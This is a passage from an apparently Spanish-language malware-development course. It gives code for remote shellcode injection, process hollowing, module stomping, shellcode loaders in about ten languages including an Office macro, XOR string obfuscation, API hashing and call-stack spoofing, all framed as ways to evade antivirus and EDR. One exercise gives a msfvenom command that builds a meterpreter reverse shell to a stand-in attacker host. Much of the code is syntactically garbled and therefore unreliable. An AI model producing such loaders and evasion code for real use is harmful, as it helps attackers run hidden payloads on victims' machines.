proc injectShellcode(pid: DWORD, shellcode: openarray[byte]) = let hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) if hProcess == 0: echo "[-] Error abriendo proceso" return let remoteMem = VirtualAllocEx(hProcess, NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE) if remoteMem == nil: echo "[-] Error asignando memoria remota" return var bytesWritten: SIZE_T = 0 let writeResult = WriteProcessMemory(hProcess, remoteMem, unsafeAddr shellcode[0], cast[SIZE_T](shellcode.len), addr bytesWritten) if writeResult == 0: echo "[-] Error escribiendo memoria" return let hThread = CreateRemoteThread(hProcess, NULL, 0, cast[LPTHREAD_START_ROUTINE](remoteMem), NULL, 0, NULL) if hThread == 0: echo "[-] Error creando thread remoto" return echo "[+] Inyeccion exitosa en proceso ", pid WaitForSingleObject(hThread, INFINITE) CloseHandle(hThread) CloseHandle(hProcess)

when isMainModule: let pid: DWORD = 1234 let shellcode: array[512, byte] = [byte 0x90, 0x90, 0x90, 0xCC] injectShellcode(pid, shellcode) ## 7. Process Hollowing

### 7.1 RunPE Technique

Process Hollowing (tambien conocido como RunPE) reemplaza el codigo de un proceso legitimo con codigo malicioso.

**Pasos:**
1. Crear un proceso legitimo en estado suspendido
2. Eliminar su seccion de imagen (unmap)
3. Asignar nueva memoria para el ejecutable malicioso
4. Escribir las cabeceras y secciones del malicioso
5. Configurar el contexto del thread para apuntar al nuevo entry point
6. Reanudar el proceso

```c
// Process Hollowing
#include <windows.h>
#include <stdio.h>

int main(int argc, char* argv) { printf("=== Process Hollowing (RunPE) ===\n\n"); if (argc < 3) { printf("Uso: %s <target.exe> <malicious.exe>\n", argv[0]); return 1; } LPCSTR targetPath = argv[1]; LPCSTR maliciousPath = argv[2]; // 1. Leer el ejecutable malicioso HANDLE hMalicious = CreateFileA(maliciousPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL); DWORD maliciousSize = GetFileSize(hMalicious, NULL); LPVOID maliciousData = HeapAlloc(GetProcessHeap, 0, maliciousSize); ReadFile(hMalicious, maliciousData, maliciousSize, &maliciousSize, NULL); CloseHandle(hMalicious); // Parsear cabeceras del malicioso PIMAGE_DOS_HEADER maliciousDos = (PIMAGE_DOS_HEADER)maliciousData; PIMAGE_NT_HEADERS maliciousNt = (PIMAGE_NT_HEADERS)(BYTE*)maliciousData + maliciousDos->e_lfanew); // 2. Crear proceso target suspendido STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); if (!CreateProcessA(targetPath, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi) { printf("Error creando proceso target: %d\n", GetLastError); return 1; } printf("[+] Proceso target creado suspendido: %d\n", pi.dwProcessId); // 3. Obtener contexto del thread CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL; GetThreadContext(pi.hThread, &ctx); // 4. Leer la base del proceso target (del [peb](../raw/w1n-1nt3rn4ls.md#peb)) LPVOID targetImageBase = NULL; ReadProcessMemory(pi.hProcess, (LPVOID)(ctx.Rdx + 0x10), &targetImageBase, sizeof(LPVOID), NULL); printf("[+] Image base del target: 0x%p\n", targetImageBase); // 5. Unmap (desmapear) la seccion de imagen original HMODULE [ntdll](../raw/w1n-1nt3rn4ls.md#ntdll) = GetModuleHandleA("[ntdll](../raw/w1n-1nt3rn4ls.md#ntdll).dll"); FarpROC ntUnmapViewOfSection = GetProcAddress([ntdll](../raw/w1n-1nt3rn4ls.md#ntdll), "NtUnmapViewOfSection"); (NTSTATUS(WINAPI*)(HANDLE, LPVOID)ntUnmapViewOfSection)(pi.hProcess, targetImageBase); printf("[+] Seccion de imagen original desmapeada\n"); // 6. Asignar memoria en el proceso target para el nuevo ejecutable LPVOID remoteImage = VirtualAllocEx(pi.hProcess, targetImageBase, maliciousNt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!remoteImage) { printf("Error: No se pudo asignar memoria (probablemente ASLR)\n"); goto cleanup; } printf("[+] Nueva memoria asignada en: 0x%p\n", remoteImage); // 7. Escribir las cabeceras WriteProcessMemory(pi.hProcess, remoteImage, maliciousData, maliciousNt->OptionalHeader.SizeOfHeaders, NULL); // 8. Escribir cada seccion PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(maliciousNt); for (WORD i = 0; i < maliciousNt->FileHeader.NumberOfSections; i++) { LPVOID sectionDest = (LPVOID)(ULONG_PTR)remoteImage + section[i].VirtualAddress); LPVOID sectionSrc = (LPVOID)(BYTE*)maliciousData + section[i].PointertorawData); WriteProcessMemory(pi.hProcess, sectionDest, sectionSrc, section[i].SizeOfRawData, NULL); printf("[+] Seccion %s escrita en 0x%p\n", section[i].Name, sectionDest); } // 9. Actualizar el entry point en el contexto del thread
#ifdef _WIN64 ctx.Rcx = (ULONG_PTR)remoteImage + maliciousNt->OptionalHeader.AddressofEntryPoint;
#else ctx.Eax = (ULONG_PTR)remoteImage + maliciousNt->OptionalHeader.AddressOfEntryPoint;
#endif ctx.ContextFlags = CONTEXT_CONTROL; SetThreadContext(pi.hThread, &ctx); printf("[+] Entry point configurado en: 0x%p\n", (LPVOID)(ULONG_PTR)remoteImage + maliciousNt->OptionalHeader.AddressOfEntryPoint); // 10. Reanudar el proceso ResumeThread(pi.hThread); printf("[+] Proceso reanudado! El codigo malicioso se esta ejecutando\n");

cleanup: HeapFree(GetProcessHeap, 0, maliciousData); CloseHandle(pi.hProcess); CloseHandle(pi.hThread); return 0;
}
```

### 7.2 Module Stomping

Module stomping (o stomping) es similar al hollowing pero en vez de eliminar la imagen completa, solo reemplaza una seccion especifica, generalmente .text.

```c
// Module Stomping - Reemplazar seccion .text de un proceso legitimo
#include <windows.h>
#include <stdio.h>

int main { printf("=== Module Stomping ===\n\n"); // 1. Encontrar la direccion base de ntdll.dll HMODULE ntdll = GetModuleHandleA("ntdll.dll"); // 2. Parsear [pe](../raw/w1n-1nt3rn4ls.md#pe) para encontrar la seccion .text PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)ntdll; PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(BYTE*)dos + dos->e_lfanew); PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt); LPVOID textStart = NULL; SIZE_T textSize = 0; for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) { if (memcmp(section[i].Name, ".text", 5) == 0) { textStart = (LPVOID)(ULONG_PTR)ntdll + section[i].VirtualAddress); textSize = section[i].Misc.VirtualSize; break; } } printf("[+] Seccion .text de ntdll.dll:\n"); printf(" Inicio: 0x%p\n", textStart); printf(" Tamano: %zu bytes\n", textSize); // 3. Cambiar [permisos](../raw/0s-f0nd4m3nt0s.md#permisos) DWORD oldProtect; VirtualProtect(textStart, textSize, PAGE_EXECUTE_READWRITE, &oldProtect); // 4. Sobrescribir con nuestro shellcode BYTE shellcode = { 0x90, 0x90, 0x90, 0xCC  // NOP NOP NOP INT3 }; // Solo sobrescribir una parte para no romper todo ntdll SIZE_T writeSize = min(sizeof(shellcode), textSize); memcpy(textStart, shellcode, writeSize); // Restaurar proteccion VirtualProtect(textStart, textSize, oldProtect, &oldProtect); printf("[+] Shellcode escrito en seccion .text!\n"); return 0;
}
```

### 7.4 Implementacion Completa en C

```c
// ProcessHollowing.c - version completa con soporte [x86](../raw/4ss3mbly-f0r-h4ck3rs.md#x86) y [x64](../raw/4ss3mbly-f0r-h4ck3rs.md#x64)
#include <windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")

// Typedef para NtUnmapViewOfSection
typedef NTSTATUS(NTAPI* pNtUnmapViewOfSection)(HANDLE, PVOID);

BOOL HollowProcess(HANDLE hProcess, LPVOID imageData, DWORD imageSize) { PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)imageData; PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(BYTE*)imageData + dos->e_lfanew); if (dos->e_magic != IMAGE_DOS_SIGnatURE || nt->Signature != IMAGE_NT_SIGNATURE) { printf("[-] PE invalido\n"); return FALSE; } // Desmapear la imagen original PROCESS_BASIC_INFORMATION pbi; ULONG returnLength; NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &returnLength); LPVOID imageBase = pbi.PebBaseAddress; // Leer la direccion base del PEB LPVOID pebImageBase = NULL; ReadProcessMemory(hProcess, &(PPEB)imageBase)->ImageBaseAddress, &pebImageBase, sizeof(LPVOID), NULL); pNtUnmapViewOfSection ntUnmap = (pNtUnmapViewOfSection) GetProcAddress(GetModuleHandleA("ntdll.dll"), "NtUnmapViewOfSection"); ntUnmap(hProcess, pebImageBase); // Asignar nueva memoria LPVOID remoteImage = VirtualAllocEx(hProcess, pebImageBase, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!remoteImage) { // Si falla la direccion exacta, dejar que el sistema decida remoteImage = VirtualAllocEx(hProcess, NULL, nt->OptionalHeader.SizeOfImage, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); if (!remoteImage) return FALSE; } // Escribir cabeceras WriteProcessMemory(hProcess, remoteImage, imageData, nt->OptionalHeader.SizeOfHeaders, NULL); // Escribir secciones PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt); for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) { if (section[i].SizeOfRawData == 0) continue; LPVOID dest = (LPVOID)(ULONG_PTR)remoteImage + section[i].VirtualAddress); LPVOID src = (LPVOID)(BYTE*)imageData + section[i].PointerToRawData); WriteProcessMemory(hProcess, dest, src, section[i].SizeOfRawData, NULL); } return TRUE;
}

int main { printf("=== Process Hollowing Completo ===\n\n"); BYTE maliciousExe = { /* .. contenido de un ejecutable completo .. */ }; STARTUPINFOA si = {0}; PROCESS_INFORMATION pi = {0}; si.cb = sizeof(si); if (!CreateProcessA("C:\\Windows\\System32\\svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi) { printf("[-] Error creando proceso\n"); return 1; } printf("[+] Proceso creado: PID %d\n", pi.dwProcessId); if (HollowProcess(pi.hProcess, maliciousExe, sizeof(maliciousExe)) { printf("[+] Process hollowing exitoso!\n"); CONTEXT ctx; ctx.ContextFlags = CONTEXT_FULL; GetThreadContext(pi.hThread, &ctx); // Actualizar entry point PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS) ((PIMAGE_DOS_HEADER)maliciousExe)->e_lfanew + (BYTE*)maliciousExe);

#ifdef _WIN64 ctx.Rcx = (DWORD64)nt->OptionalHeader.AddressOfEntryPoint;
#else ctx.Eax = nt->OptionalHeader.AddressOfEntryPoint;
#endif SetThreadContext(pi.hThread, &ctx); ResumeThread(pi.hThread); printf("[+] Proceso reanudado!\n"); } CloseHandle(pi.hThread); CloseHandle(pi.hProcess); return 0;
}
```

### 7.7 Ejercicio Practico: Process Hollowing

**Escenario:** Necesitas ejecutar un payload EXE sin escribir en disco, usando un proceso legitimo como contenedor.

**Tarea:** Implementar process hollowing que:
1. Cree un proceso suspendido (por ejemplo, notepad.exe)
2. Reemplace su codigo con un payload propio
3. Lo reanude para que ejecute el payload

**Pistas:**
1. Parsear el PE malicioso para obtener cabeceras y secciones.
2. Usar NtUnmapViewOfSection para limpiar la imagen original.
3. VirtualAllocEx para la nueva imagen.
4. WriteProcessMemory para las secciones una por una.
5. SetThreadContext para el nuevo entry point.

---

## 8. Shellcode Loaders

### 8.1 Que es un Shellcode Loader?

Un shellcode loader es un programa que toma shellcode (codigo maquina) y lo ejecuta en memoria. Es el componente fundamental del malware moderno.

**Funcion basica de un loader:**
1. Obtener el shellcode (de un archivo, red, o embebido)
2. Asignar memoria con permisos de ejecucion
3. Copiar el shellcode
4. Ejecutarlo

### 8.2 Loader en C

```c
// shellcode_loader.c
#include <windows.h>
#include <stdio.h>

// Forma mas simple: array de bytes
unsigned char shellcode = { 0x90, 0x90, 0x90, 0xCC // NOP NOP NOP INT3
};

int main { // 1. Asignar memoria LPVOID execMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE); // 2. Copiar shellcode memcpy(execMem, shellcode, sizeof(shellcode); // 3. Ejecutar (void(*)execMem); return 0;
}
```

**Loader con callback:**
```c
// Usar callbacks de Windows para ejecutar shellcode
BOOL CALLBACK Callback(LPVOID lpParameter) { (void(*)lpParameter); return TRUE;
}

int main { LPVOID execMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(execMem, shellcode, sizeof(shellcode); // Callback EnumChildWindows EnumChildWindows(NULL, (WNDENUMPROC)execMem, NULL); // Otros callbacks utiles: // EnumDesktopsA(GetProcessWindowStation, (DESKTOPENUMPROCA)execMem, NULL); // EnumWindowStationsA(WINSTAENUMPROCA)execMem, NULL); // EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)execMem); // EnumTimeFormatsA(TIMEFMT_ENUMPROCA)execMem, NULL, 0); // EnumUILanguagesA(UILANGUAGE_ENUMPROCA)execMem, 0, 0); return 0;
}
```

**Loader con Fibers:**
```c
// Usar Fibers para ejecutar shellcode
void WINAPI FiberFunc(LPVOID lpParam) { (void(*)lpParam);
}

int main { LPVOID execMem = VirtualAlloc(NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE); memcpy(execMem, shellcode, sizeof(shellcode); LPVOID mainFiber = ConvertThreadToFiber(NULL); LPVOID shellcodeFiber = CreateFiber(0, FiberFunc, execMem); switchToFiber(shellcodeFiber); DeleteFiber(shellcodeFiber); ConvertFiberToThread; return 0;
}
```

### 8.3 Loader en Go

```go
// shellcode_loader.go
package main

import ( "fmt" "[syscall](../raw/0s-f0nd4m3nt0s.md#syscalls)" "unsafe"
)

var shellcode = byte{ 0x90, 0x90, 0x90, 0xCC,
}

func main { kernel3232) := syscall.MustLoadDLL("[kernel32](../raw/w1n-1nt3rn4ls.md#kernel32).dll") virtualAlloc := [kernel32](../raw/w1n-1nt3rn4ls.md#kernel32).MustFindProc("VirtualAlloc") rtlMoveMemory := [kernel32](../raw/w1n-1nt3rn4ls.md#kernel32).MustFindProc("RtlMoveMemory") // Asignar memoria addr, _, _ := virtualAlloc.Call(0, uintptr(len(shellcode), 0x3000, // MEM_COMMIT | MEM_RESERVE 0x40) // PAGE_EXECUTE_READWRITE if addr == 0 { fmt.Println("[-] Error asignando memoria") return } // Copiar shellcode rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)) fmt.Println("[+] Shellcode copiado en:", addr) // Ejecutar como [funcion](../raw/pr0gr4mm1ng-f0nd4m3nt0s.md#funciones) syscall.Syscall(addr, 0, 0, 0, 0)
}

// Implementacion alternativa con syscall directo
func executeShellcode(shellcode byte) { addr, _, _ := syscall.Syscall6( kernel32.MustFindProc("VirtualAlloc").Addr, 4, 0, uintptr(len(shellcode), 0x3000, 0x40, 0, 0) kernel32.MustFindProc("RtlMoveMemory").Call( addr, uintptr(unsafe.Pointer(&shellcode[0]), uintptr(len(shellcode)) syscall.Syscall(addr, 0, 0, 0, 0)
}
```

### 8.4 Loader en Rust

```rust
// shellcode_loader.rs
use std::mem;
use winapi::um::memoryapi::VirtualAlloc;
use winapi::um::winbase::VirtualAlloc;
use winapi::um::errhandlingapi::GetLastError;

fn main { let shellcode: [u8; 4] = [0x90, 0x90, 0x90, 0xCC]; unsafe { let addr = VirtualAlloc( std::ptr::null_mut, shellcode.len, 0x3000, // MEM_COMMIT | MEM_RESERVE 0x40, // PAGE_EXECUTE_READWRITE ); if addr.is_null { println!("Error: VirtualAlloc fallo: {}", GetLastError); return; } std::ptr::copy_nonoverlapping( shellcode.as_ptr, addr as *mut u8, shellcode.len, ); println!("Shellcode copiado a: {:p}", addr); let func: extern "system" fn = mem::transmute(addr); func; }
}
```

### 8.5 Loader en Nim

```nim
# shellcode_loader.nim
import winim

proc ExecuteShellcode(shellcode: openarray[byte]) = let addr = VirtualAlloc(NULL, cast[SIZE_T](shellcode.len), MEM_COMMIT or MEM_RESERVE, PAGE_EXECUTE_READWRITE) if addr == nil: echo "[-] VirtualAlloc fallo" return copyMem(addr, unsafeAddr shellcode[0], shellcode.len) echo "[+] Shellcode cargado en: ", addr # Ejecutar como funcion let funcPtr = cast[proc {.stdcall.}](addr) funcPtr

when isMainModule: let shellcode: array[512, byte] = [ byte 0x90, 0x90, 0x90, 0xCC,  # placeholder ] ExecuteShellcode(shellcode)
```

### 8.6 Loader en VBA (Macro)

```vba
' shellcode_loader.vba (Macro de Word/Excel)
Private Declare Ptrsafe Function VirtualAlloc Lib "kernel32" _ (ByVal lpAddress As LongPtr, ByVal dwSize As Long, _ ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" _ (ByVal lDestination As LongPtr, ByRef sSource As Any, _ ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function CreateThread Lib "kernel32" _ (ByVal lpthreadAttributes As LongPtr, ByVal dwStackSize As Long, _ ByVal lpStartAddress As LongPtr, lpParameter As Any, _ ByVal dwCreationFlags As Long, lpThreadId As LongPtr) As LongPtr

Private Declare PtrSafe Function WaitForSingleObject Lib "kernel32" _ (ByVal hHandle As LongPtr, ByVal dwmilliseconds As Long) As Long

Sub Execute Dim shellcode As Variant Dim shellcodeBytes As Byte Dim addr As LongPtr Dim hThread As LongPtr ' Shellcode (base64 encoded o array) shellcode = Array(&H90, &H90, &H90, &HCC) ' Convertir a bytes redim shellcodeBytes(UBound(shellcode) For i = 0 To UBound(shellcode) shellcodeBytes(i) = shellcode(i) Next i ' Asignar memoria addr = VirtualAlloc(0, UBound(shellcodeBytes) + 1, &H3000, &H40) If addr = 0 Then MsgBox "Error: VirtualAlloc fallo" Exit Sub End If ' Copiar shellcode RtlMoveMemory addr, shellcodeBytes(0), UBound(shellcodeBytes) + 1 ' Ejecutar hThread = CreateThread(0, 0, addr, 0, 0, 0) WaitForSingleObject hThread, -1 MsgBox "Shellcode ejecutado!"
End Sub
```

### 8.7 Loader en PowerShell

```powershell
# shellcode_loader.ps1
function Invoke-Shellcode { param( [byte]$shellcode ) $code = @" [DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
"@ $win32 = Add-Type -memberDefinition $code -name "Win32" -namespace Win32Functions -passthru $addr = $win32::VirtualAlloc([IntPtr]::Zero, $shellcode.Length, 0x3000, 0x40) if ($addr -eq [IntPtr]::Zero) { Write-Host "[-] VirtualAlloc fallo" return } [System.Runtime.InteropServices.Marshal]::Copy($shellcode, 0, $addr, $shellcode.Length) $hThread = $win32::CreateThread([IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [IntPtr]::Zero) $win32::WaitForSingleObject($hThread, [System.Threading.Timeout]::Infinite) Write-Host "[+] Shellcode ejecutado!"
}

# Ejemplo de uso
$shellcode = [byte]@(0x90, 0x90, 0x90, 0xCC)
Invoke-Shellcode -shellcode $shellcode
```

### 8.8 Loader en C# (via .NET)

```csharp
// ShellcodeLoader.cs
using System;
using System.Runtime.InteropServices;

class ShellcodeLoader
{ [DllImport("kernel32.dll", SetLastError = true)] static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect); [DllImport("kernel32.dll")] static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId); [DllImport("kernel32.dll")] static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds); static void Main { byte shellcode = new byte { 0x90, 0x90, 0x90, 0xCC }; IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length, 0x3000, 0x40); Marshal.Copy(shellcode, 0, addr, shellcode.Length); IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero); WaitForSingleObject(hThread, 0xFFFFFFFF); }
}
```

### 8.9 Loader en Python

```python
# shellcode_loader.py
import ctypes
import os

shellcode = b"\x90\x90\x90\xCC"

# Abrir kernel32
kernel32 = ctypes.windll.kernel32

# VirtualAlloc
addr = kernel32.VirtualAlloc( None, len(shellcode), 0x3000,  # MEM_COMMIT | MEM_RESERVE 0x40 # PAGE_EXECUTE_READWRITE
)

# RtlMoveMemory
ctypes.windll.kernel32.RtlMoveMemory( ctypes.c_void_p(addr), shellcode, len(shellcode)
)

# CreateThread
hThread = kernel32.CreateThread( None, 0, ctypes.c_void_p(addr), None, 0, None
)

kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF)

print("[+] Shellcode ejecutado!")
```

### 8.10 Loader en JavaScript/NodeJS

```javascript
// shellcode_loader.js (Node.js con ffi-napi)
const ffi = require('ffi-napi');
const ref = require('ref-napi');

const voidPtr = ref.refType(ref.types.void);
const uint32 = ref.types.uint32;

const kernel32 = ffi.Library('kernel32.dll', { 'VirtualAlloc': [voidPtr, [voidPtr, uint32, uint32, uint32]], 'CreateThread': [voidPtr, [voidPtr, uint32, voidPtr, voidPtr, uint32, voidPtr]], 'WaitForSingleObject': [uint32, [voidPtr, uint32]]
});

// Shellcode
const shellcode = Buffer.from([0x90, 0x90, 0x90, 0xCC]);

// Allocate memory
const addr = kernel32.VirtualAlloc(null, shellcode.length, 0x3000, 0x40);

// Copy shellcode
for (let i = 0; i < shellcode.length; i++) { addr.writeUInt8(shellcode[i], i);
}

// Execute
const hThread = kernel32.CreateThread(null, 0, addr, null, 0, null);
kernel32.WaitForSingleObject(hThread, 0xFFFFFFFF);

console.log('Shellcode ejecutado!');
```

### 8.11 Tecnicas Avanzadas: Callbacks, Fibers, etc.

**Callbacks de Windows para ejecucion sigilosa:**

```c
// Ejecutar shellcode usando callbacks de Windows
void CallbackExecution { // EnumChildWindows - recorre ventanas hijas EnumChildWindows(NULL, (WNDENUMPROC)shellcodePtr, NULL); // EnumDesktops - recorre escritorios EnumDesktopsA(GetProcessWindowStation, (DESKTOPENUMPROCA)shellcodePtr, NULL); // EnumWindowStations - recorre estaciones de ventana EnumWindowStationsA(WINSTAENUMPROCA)shellcodePtr, NULL); // EnumSystemGeoID - recorre [ids](../raw/s3c-f0nd4m3nt0s.md#ids-ips))) geograficos EnumSystemGeoID(GEOCLASS_NATION, 0, (GEO_ENUMPROC)shellcodePtr); // EnumUILanguages - recorre idiomas de UI EnumUILanguagesA(UILANGUAGE_ENUMPROCA)shellcodePtr, 0, 0); // EnumDateFormats - recorre formatos de fecha EnumDateFormatsA(DATEFMT_ENUMPROCA)shellcodePtr, 0, 0); // EnumSystemCodePagesA - recorre code pages EnumSystemCodePagesA(CODEPAGE_ENUMPROCA)shellcodePtr, 0);
}
```

### 8.12 Ejercicio Practico: Shellcode Loader

**Escenario:** Tienes shellcode de meterpreter y necesitas cargarlo sin ser detectado.

**Tarea:** Crear un loader en C que use callbacks y evite llamadas directas a CreateThread.

**Pistas:**
1. Usa VirtualAlloc con PAGE_READWRITE primero, luego VirtualProtect a PAGE_EXECUTE_READ.
2. No uses CreateRemoteThread o CreateThread - usa callbacks.
3. Ofusca las llamadas a API con hashing.
4. Prueba con shellcode de Msfvenom: `msfvenom -p windows/x64/meterpreter/reverse_https LHOST=attacker.com LPORT=443 -f c`

---

## 9. Obfuscacion

### 9.1 String Encryption

Ofuscar strings para evitar deteccion por firma estatica:

```c
// String encryption con XOR
#include <windows.h>
#include <stdio.h>

// Macro para ofuscar strings
#define OBFUSCATE(str, key) obfuscateString(str, sizeof(str), key)

void obfuscateString(char* str, size_t len, char key) { for (size_t i = 0; i < len; i++) { str[i] ^= key; }
}

// Strings ofuscados en BSS
char sCreateFile[32] = { 0x23, 0x2D, 0x2E, 0x21, 0x3F, 0x22, 0x29, 0x34, 0x00 };
char sReadFile[32] = { 0x37, 0x2E, 0x28, 0x33, 0x34, 0x22, 0x29, 0x34, 0x00 };
char sWriteFile[32]  = { 0x3A, 0x3F, 0x32, 0x3D, 0x33, 0x22, 0x29, 0x34, 0x00 };

// O: usar stack strings
void stackStringExample { // El string "kernel32.dll" nunca aparece como literal en el binario char dllName[13]; dllName[0] = 'k'; dllName[1] = 'e'; dllName[2] = 'r'; dllName[3] = 'n'; dllName[4] = 'e'; dllName[5] = 'l'; dllName[6] = '3'; dllName[7] = '2'; dllName[8] = '.'; dllName[9] = 'd'; dllName[10] = 'l'; dllName[11] = 'l'; dllName[12] = '\0'; HMODULE hKernel32 = GetModuleHandleA(dllName);
}

// O: compilar en tiempo de compilacion con macros
#define STR1(c) #c
#define STR2(c) STR1(c)
#define OBF(s, k) OBFUSCATE_MACRO(s, k)

int main { // Decrypt en runtime obfuscateString(sCreateFile, sizeof(sCreateFile), 0x55); obfuscateString(sReadFile, sizeof(sReadFile), 0x55); printf("Strings descifrados: %s, %s\n", sCreateFile, sReadFile); // Volver a ofuscar obfuscateString(sCreateFile, sizeof(sCreateFile), 0x55); obfuscateString(sReadFile, sizeof(sReadFile), 0x55); return 0;
}
```

### 9.3 API Hashing

En vez de llamar a GetProcAddress con el nombre de la funcion en texto, calculamos un hash del nombre y lo comparamos.

```c
// API hashing
#include <windows.h>
#include <stdio.h>

// DJB2 [hash](../raw/crypt0-f0r-h4ck3rs.md#hash-functions) algorithm
DWORD HashStringDJB2(LPCSTR str) { DWORD hash = 5381; int c; while (c = *str++) { hash = (hash << 5) + hash) + c; // hash * 33 + c } return hash;
}

// CRC32 hash (simplificado)
DWORD HashStringCRC32(LPCSTR str) { DWORD hash = 0xFFFFFFFF; int c; while (c = *str++) { hash ^= c; for (int i = 0; i < 8; i++) { if (hash & 1) hash = (hash >> 1) ^ 0xEDB88320; else hash >>= 1; } } return ~hash;
}

// Tabla de hashes de funciones que necesitamos
typedef struct { DWORD hash; FARPROC address;
} HASHED_API;

// Resolver APIs por hash (sin strings en el binario)
FARPROC GetProcAddressByHash(HMODULE hModule, DWORD targetHash) { PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hModule; PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)(BYTE*)dos + dos->e_lfanew); PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY) (BYTE*)dos + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress); DWORD* names = (DWORD*)(BYTE*)dos + exports->AddressOfNames); DWORD* functions = (DWORD*)(BYTE*)dos + exports->AddressOfFunctions); WORD* ordinals = (WORD*)(BYTE*)dos + exports->AddressOfNameOrdinals); for (DWORD i = 0; i < exports->NumberOfNames; i++) { LPCSTR funcName = (LPCSTR)(BYTE*)dos + names[i]); DWORD hash = HashStringDJB2(funcName); if (hash == targetHash) { return (FARPROC)(BYTE*)dos + functions[ordinals[i]]); } } return NULL;
}

// Hashes precalculados
// HashStringDJB2("VirtualAlloc") = 0xDEABC1D3
// HashStringDJB2("CreateThread") = 0x0C92B93F
// HashStringDJB2("WaitForSingleObject") = 0x7B3B6A1B

int main { printf("=== API Hashing Demo ===\n\n"); // Calcular hashes (simulado - en el binario final estos son constantes) printf("Hash de VirtualAlloc: 0x%08X\n", HashStringDJB2("VirtualAlloc"); printf("Hash de CreateThread: 0x%08X\n", HashStringDJB2("CreateThread"); printf("Hash de VirtualProtect: 0x%08X\n", HashStringDJB2("VirtualProtect"); HMODULE hKernel32 = GetModuleHandleA("kernel32.dll"); // Resolver por hash DWORD hashVirtualAlloc = 0xDEABC1D3;  // Precalculado FARPROC pVirtualAlloc = GetProcAddressByHash(hKernel32, hashVirtualAlloc); if (pVirtualAlloc) { printf("VirtualAlloc encontrado por hash!\n"); } else { printf("No se encontro la funcion\n"); } return 0;
}
```

### 9.4 Call Stack Spoofing

Call stack spoofing falsifica la pila de llamadas para que el EDR crea que el codigo se origino en un contexto legitimo.

```c
// Call Stack Spoofing simplificado
#include <windows.h>
#include <stdio.h>

// Estructura para guardar contexto del stack
typedef struct _STACK_FRAME { struct _STACK_FRAME* next; ULONG_PTR returnAddress;
} STACK_FRAME, *PSTACK_FRAME;

// Funcion que "parece" legitima en el stack
void LegitimateFunction { // Esta funcion aparece en el stack trace __nop; __nop; __nop;
}

// Spoofear el return address
void Spoofcallstack(LPVOID targetFunction) { // Guardar el return address original ULONG_PTR originalReturn = (ULONG_PTR)_ReturnAddress; // Crear un frame falso en el stack STACK_FRAME fakeFrame; fakeFrame.returnAddress = (ULONG_PTR)LegitimateFunction; fakeFrame.next = (PSTACK_FRAME)_AddressOfReturnAddress; // Escribir el frame falso // (Esto es simplificado - la implementacion real requiere [asm](../raw/4ss3mbly-f0r-h4ck3rs.md)) // ..
}

int main { printf("=== Call Stack Spoofing ===\n\n"); printf("Concepto: falsificar el call stack para evadir deteccion\n"); // En la practica, se necesita: // 1. ROP chains // 2. Manipular el shadow stack // 3. Usar hardware breakpoints para modificar return addresses return 0;
}
```

**Implementacion avanzada de call stack spoofing:**
```asm
; CallStackSpoofing.asm
.code

; Fake function that appears in stack traces
FakeFunction PROC ret
FakeFunction ENDP

; Entry point with spoofed stack
